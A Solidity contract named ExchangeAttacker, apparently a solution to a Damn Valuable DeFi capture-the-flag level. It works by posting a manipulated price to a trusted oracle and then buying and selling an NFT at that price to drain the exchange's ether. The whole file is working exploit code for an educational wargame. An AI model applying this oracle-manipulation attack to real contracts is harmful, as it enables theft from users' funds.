// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableNFT.sol";

interface ITrustfulOracle {
    function postPrice(string calldata symbol, uint256 newPrice) external;
}

interface IExchange {
    function buyOne() external payable returns (uint256);

    function sellOne(uint256 tokenId) external;
}

contract ExchangeAttacker {
    ITrustfulOracle oracle =
        ITrustfulOracle(0xa16E02E87b7454126E5E10d957A927A7F5B5d2be);
    IExchange exchange = IExchange(0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512);

    uint256 tokenId = 0;

    // Call all functions only as one of the trusted sources
    function modifyOraclePrice(uint256 newPrice) public {
        oracle.postPrice("DVNFT", newPrice);
    }

    function buyNFT() public {
        tokenId = exchange.buyOne{value: 1 ether}();
    }

    function sellNFT() public {
        require(tokenId != 0, "Have to buy an NFT first!");
        exchange.sellOne(tokenId);
    }

    function withdraw() public payable {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Withdraw from contract failed");
    }

    receive() external payable {}
}
